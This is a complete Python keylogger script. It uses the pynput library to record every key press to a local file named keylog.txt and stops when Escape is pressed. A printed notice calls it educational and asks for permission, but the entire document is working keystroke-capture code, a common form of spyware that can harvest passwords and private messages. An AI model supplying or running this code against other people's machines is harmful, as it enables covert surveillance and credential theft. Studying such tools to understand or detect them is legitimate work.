import pynput
from pynput.keyboard import Key, Listener

# Disclaimer and ethical notice
print("This keylogger program is for educational purposes only. Ensure you have permission to use it.")

# File to store logged keys
LOG_FILE = "keylog.txt"

def write_to_file(key):
    """Write the pressed key to the log file."""
    with open(LOG_FILE, "a") as file:
        # Format the key output
        if key == Key.space:
            file.write("[SPACE]")
        elif key == Key.enter:
            file.write("[ENTER]\n")
        elif key == Key.backspace:
            file.write("[BACKSPACE]")
        else:
            key_str = str(key).replace("'", "")  # Remove quotes from character keys
            file.write(key_str)

# Define key press event handler
def on_press(key):
    try:
        write_to_file(key)
    except Exception as e:
        print(f"Error writing key to file: {e}")

# Define key release event handler
def on_release(key):
    if key == Key.esc:  # Exit keylogger when 'Escape' is pressed
        print("\nKeylogger stopped.")
        return False

# Start listening to keyboard events
print("Keylogger started. Press 'Escape' to stop.")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
